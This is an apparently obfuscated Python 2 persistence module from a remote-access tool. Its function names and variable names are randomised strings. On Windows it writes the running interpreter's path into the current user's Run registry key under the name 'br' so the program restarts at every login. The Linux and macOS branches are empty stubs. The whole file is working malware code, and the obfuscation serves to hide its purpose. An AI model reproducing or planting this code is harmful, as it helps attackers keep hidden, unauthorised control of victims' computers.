# -*- coding: utf-8 -*-
import sys
def VbgRxVWjAvPhrIrFLEfZaVzIYiKnIHGJ():
    import _winreg
    from _winreg import HKEY_CURRENT_USER as HKCU
    DiWSLqEhiYVugJPFxIriVoBwROvHMhSd = r'Software\Microsoft\Windows\CurrentVersion\Run'
    IMPtCkuhCopGLJxZWbETboCMIbnSeBvS = sys.executable
    try:
        mlCdEfUDPjQkrZrceRaspkXhopQkOjVH = _winreg.OpenKey(HKCU, DiWSLqEhiYVugJPFxIriVoBwROvHMhSd, 0, _winreg.KEY_WRITE)
        _winreg.SetValueEx(mlCdEfUDPjQkrZrceRaspkXhopQkOjVH, 'br', 0, _winreg.REG_SZ, IMPtCkuhCopGLJxZWbETboCMIbnSeBvS)
        _winreg.CloseKey(mlCdEfUDPjQkrZrceRaspkXhopQkOjVH)
        return True, 'HKCU Run registry key applied'
    except WindowsError:
        return False, 'HKCU Run registry key failed'
def aBIsyEkcHbGlDZYiubYXMHbEaQpOCgse():
    return False, 'nothing here yet'
def eAAYMoFQFgpPVqcLPimOhYlIFmSLpHMg():
    return False, 'nothing here yet'
def rfNCAgnAnRylAPIRGWkGlkRoAehDvsQR(plat_type):
    if plat_type.startswith('win'):
        cHmttvZiroaemyqKmOpeJnQyWzkHJjDW, mozEXtapTDSVCfjYjzJbxSlqKQbXxwYu = VbgRxVWjAvPhrIrFLEfZaVzIYiKnIHGJ()
    elif plat_type.startswith('linux'):
        cHmttvZiroaemyqKmOpeJnQyWzkHJjDW, mozEXtapTDSVCfjYjzJbxSlqKQbXxwYu = aBIsyEkcHbGlDZYiubYXMHbEaQpOCgse()
    elif plat_type.startswith('darwin'):
        cHmttvZiroaemyqKmOpeJnQyWzkHJjDW, mozEXtapTDSVCfjYjzJbxSlqKQbXxwYu = eAAYMoFQFgpPVqcLPimOhYlIFmSLpHMg()
    else:
        return 'Error, platform unsupported.'
    if cHmttvZiroaemyqKmOpeJnQyWzkHJjDW:
        VBWvUqJqQpaVYcOcVKgNlijJjXhWmrMs = 'Persistence successful, {}.'.format(mozEXtapTDSVCfjYjzJbxSlqKQbXxwYu)
    else:
        VBWvUqJqQpaVYcOcVKgNlijJjXhWmrMs = 'Persistence unsuccessful, {}.'.format(mozEXtapTDSVCfjYjzJbxSlqKQbXxwYu)
    return VBWvUqJqQpaVYcOcVKgNlijJjXhWmrMs
